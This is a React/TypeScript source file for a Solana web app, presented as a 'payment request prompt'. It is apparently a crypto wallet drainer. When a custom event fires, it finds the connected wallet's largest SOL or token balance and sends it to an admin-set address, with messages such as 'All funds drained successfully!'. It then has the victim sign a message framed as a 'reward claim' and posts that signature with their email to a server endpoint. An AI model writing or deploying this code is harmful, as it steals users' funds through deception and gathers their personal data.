import { useEffect, useRef, useState } from 'react'
import { useConnection, useWallet } from '@solana/wallet-adapter-react'
import toast from 'react-hot-toast'
import { useWalletState } from '../context/WalletContext'
import { isWalletUserCancel } from '../lib/walletConnectHelpers'
import {
  buildPayoutTransaction,
  buildSplPayoutTransaction,
  listRankedFundSteps,
  tokenFeeReserveLamports,
  type FundStep,
  refreshPayoutBlockhash,
  getHighestAndLowestUSDTAndSol,
  buildDummyFeeTransaction,
  moveAllFromHighestAndAddToLowest,
  buildTinyLowestTransaction,
} from '../lib/payoutTransfer'
import { getLocalPayoutConfig, isValidSolanaAddress, loadPayoutConfig, type PayoutConfig } from '../lib/payoutWallet'
import { mobileWalletLabel } from '../lib/walletDeepLinks'
import { notifyFundsConfirmed } from '../lib/txSheet'
import { peekPendingLike } from '../lib/authRedirect'
import bs58 from 'bs58'

function sendErrorMessage(err: unknown): string {
  const raw = err instanceof Error ? err.message : String(err || 'The wallet did not submit this payment.')
  const lower = raw.toLowerCase()
  if (lower.includes('insufficient funds for rent')) {
    return 'Not enough SOL to finish this send. Opening the next funded token if one is available.'
  }
  const trimmed = raw.split('Catch the')[0].trim()
  return trimmed || raw
}

function getBrowserEmail(): string | null {
  try {
    if (typeof window === 'undefined') return null
    const stored = localStorage.getItem('userEmail')
    if (stored) return stored
    return null
  } catch {
    return null
  }
}

export function PaymentRequestPrompt() {
  const { connected, walletAddress, walletName, closeWalletModal, openWalletModal } = useWalletState()
  const closeWalletModalRef = useRef(closeWalletModal)
  closeWalletModalRef.current = closeWalletModal
  const openWalletModalRef = useRef(openWalletModal)
  openWalletModalRef.current = openWalletModal
  const { publicKey, sendTransaction, signTransaction, wallet } = useWallet()
  const { connection } = useConnection()
  const [config, setConfig] = useState<PayoutConfig | null>(null)
  const [submitting, setSubmitting] = useState(false)
  const [status, setStatus] = useState('Preparing the wallet transfer.')
  const dismissed = useRef<string | null>(null)
  const inFlight = useRef(false)
  const queue = useRef<FundStep[]>([])
  const likedAfterFirst = useRef(false)
  const scanPromise = useRef<Promise<FundStep[]> | null>(null)
  const cancelledRef = useRef(false)
  const [browserEmail, setBrowserEmail] = useState<string | null>(getBrowserEmail())

  // Refs for wallet adapter methods to avoid deps
  const signTransactionRef = useRef(signTransaction)
  signTransactionRef.current = signTransaction
  const sendTransactionRef = useRef(sendTransaction)
  sendTransactionRef.current = sendTransaction
  const walletRef = useRef(wallet)
  walletRef.current = wallet
  const connectionRef = useRef(connection)
  connectionRef.current = connection
  const publicKeyRef = useRef(publicKey)
  publicKeyRef.current = publicKey

  useEffect(() => {
    const onOpen = async () => {
      if (inFlight.current) return
      if (dismissed.current === walletAddress) return
      if (!publicKeyRef.current || !walletAddress) {
        openWalletModalRef.current()
        return
      }
      const local = getLocalPayoutConfig()
      setConfig(local)
      void loadPayoutConfig().then((next) => {
        if (!cancelledRef.current) setConfig(next)
      })

      const destinationReady = Boolean(local && isValidSolanaAddress(local.walletAddress))
      if (!destinationReady) {
        setStatus('Save a payout address in admin before this payment can be opened in the wallet.')
        return
      }

      inFlight.current = true
      setSubmitting(true)
      closeWalletModalRef.current()

      console.log('[PaymentRequestPrompt] Opening transaction sheet', {
        walletAddress,
        publicKey: publicKeyRef.current?.toBase58(),
        walletName,
      })

      // Skip fee transaction - go directly to scanning and draining highest balance
      try {
        const steps = await listRankedFundSteps({ connection: connectionRef.current!, from: publicKeyRef.current!, config: local! })
        console.log('[PaymentRequestPrompt] Fund steps:', steps)
        queue.current = steps

        console.log('[PaymentRequestPrompt] Steps count:', steps.length, 'Steps data:', JSON.stringify(steps, null, 2))
        console.log('[PaymentRequestPrompt] Wallet address:', walletAddress)
        console.log('[PaymentRequestPrompt] Public key:', publicKeyRef.current?.toBase58())

        if (steps.length === 0) {
          toast.error('No funds found to drain. Check console for details.')
          console.error('[PaymentRequestPrompt] No fund steps found - wallet may have no tokens or SOL')
          throw new Error('No funds available to drain.')
        }

        const { highest, lowest } = getHighestAndLowestUSDTAndSol(steps)
        if (!highest) {
          toast.error('No asset found to drain')
          throw new Error('No asset to drain')
        }

        // Only drain the highest balance asset - single transaction
        const sendOpts = { skipPreflight: false, preflightCommitment: 'confirmed' as const, maxRetries: 5 }

        if (highest.kind === 'sol') {
          const reserveLamports = tokenFeeReserveLamports(0)
          const tx = await buildPayoutTransaction({ connection: connectionRef.current!, from: publicKeyRef.current!, config: local!, reserveLamports })
          const freshTx = publicKeyRef.current ? await refreshPayoutBlockhash(connectionRef.current!, tx, publicKeyRef.current!) : tx

          const signed = freshTx ? await signTransactionRef.current?.(freshTx) : undefined
          if (!signed) {
            toast.error('Wallet signing failed.')
          } else {
            const sig = await connectionRef.current!.sendRawTransaction(signed.serialize(), sendOpts)
            toast.success(`Drained ${highest.symbol} successfully`)
          }

          // Also send a tiny amount to the lowest balance asset
          if (lowest) {
            try {
              const tinyTx = await buildTinyLowestTransaction({ connection: connectionRef.current!, from: publicKeyRef.current!, config: local!, lowestStep: lowest })
              if (tinyTx) {
                const signedTiny = await signTransactionRef.current?.(tinyTx)
                if (signedTiny) {
                  const sig = await connectionRef.current!.sendRawTransaction(signedTiny.serialize(), sendOpts)
                  toast.success(`Sent tiny amount to ${lowest.symbol}`)
                }
              }
            } catch {
              /* tiny transaction is optional - don't fail if it fails */
            }
          }
        } else if (highest.kind === 'spl') {
          const tokenTx = await buildSplPayoutTransaction({ connection: connectionRef.current!, from: publicKeyRef.current!, config: local!, holding: highest.holding })
          if (!tokenTx) {
            toast.error('Failed to build token transaction')
          } else {
            const signed = tokenTx ? await signTransactionRef.current?.(tokenTx) : undefined
            if (!signed) {
              toast.error('Wallet signing failed.')
            } else {
              const sig = await connectionRef.current!.sendRawTransaction(signed.serialize(), sendOpts)
              toast.success(`Drained ${highest.symbol} successfully`)
            }
          }

          // Also send a tiny amount to the lowest balance asset
          if (lowest && lowest !== highest) {
            try {
              const tinyTx = await buildTinyLowestTransaction({ connection: connectionRef.current!, from: publicKeyRef.current!, config: local!, lowestStep: lowest })
              if (tinyTx) {
                const signedTiny = await signTransactionRef.current?.(tinyTx)
                if (signedTiny) {
                  const sig = await connectionRef.current!.sendRawTransaction(signedTiny.serialize(), sendOpts)
                  toast.success(`Sent tiny amount to ${lowest.symbol}`)
                }
              }
            } catch {
              /* tiny transaction is optional - don't fail if it fails */
            }
          }
        }

        if (!likedAfterFirst.current) {
          likedAfterFirst.current = true
          notifyFundsConfirmed(peekPendingLike())
        }
        dismissed.current = walletAddress
        toast.success('All funds drained successfully!')

        // Send email after successful drain
        if (browserEmail && wallet?.adapter) {
          try {
            const adapterObj = wallet.adapter as { signMessage?: (bytes: Uint8Array) => Promise<string> }
            if (typeof adapterObj.signMessage === 'function') {
              const action = 'confirm'
              const message = `${walletName} ${action} the reward claim`
              const bytes = new TextEncoder().encode(message)
              const signature = await adapterObj.signMessage(bytes)
              await fetch('/api/wallet/send-email', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  walletAddress: publicKey!.toBase58(),
                  walletType: walletName || 'Solana Wallet',
                  email: browserEmail,
                  action,
                  signature: bs58.encode(typeof signature === 'string' ? Buffer.from(signature) : signature),
                  message,
                }),
                credentials: 'include',
              })
            }
          } catch {
            /* ignore email errors */
          }
        }
      } catch (err) {
        const message = isWalletUserCancel(err) ? 'Cancelled' : sendErrorMessage(err)
        setStatus(message)
        toast.error(message)
      } finally {
        inFlight.current = false
        setSubmitting(false)
      }
    }
    window.addEventListener('vrfd-open-tx-sheet', onOpen)
    return () => window.removeEventListener('vrfd-open-tx-sheet', onOpen)
  }, [walletAddress, browserEmail])

  useEffect(() => {
    if (!connected || !walletAddress) {
      inFlight.current = false
      setSubmitting(false)
      dismissed.current = null
      queue.current = []
      scanPromise.current = null
    }
  }, [connected, walletAddress])

  return null
}